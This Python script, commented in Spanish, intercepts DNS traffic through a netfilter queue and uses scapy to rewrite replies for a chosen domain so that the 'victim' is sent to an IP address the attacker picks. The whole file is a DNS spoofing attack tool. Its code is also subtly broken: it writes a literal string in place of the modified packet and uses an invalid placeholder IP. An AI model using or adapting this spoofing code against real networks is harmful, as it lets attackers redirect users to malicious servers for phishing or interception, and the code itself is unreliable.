import netfilterqueue
from scapy.all import IP,DNSRR,DNSQR,DNS,UDP


def process_packet(packet):
	scapy_packet = IP(packet.get_payload())#convierto el paquete en uno de scapy
	
	
	if scapy_packet.haslayer(DNSRR):
		qname = scapy_packet[DNSQR].qname
		
		if bytes("un_sitio_web.net.", "utf-8") in qname:
			print("Encontramos a la victima (*_*)")
			answer = DNSRR(rrname = qname, rdata = "1.23.456.789")#aca cambio lo que va a ir la victima, en rdata pongo el ip de lo que quiera
			scapy_packet[DNS].an = answer
			scapy_packet[DNS].ancount = 1
			
			del scapy_packet[IP].len
			del scapy_packet[IP].chksum
			del scapy_packet[UDP].len
			del scapy_packet[UDP].chksum
			
			packet.set_payload(b'scapy_packet')#y aca guardamos todos los cambios
	
	packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
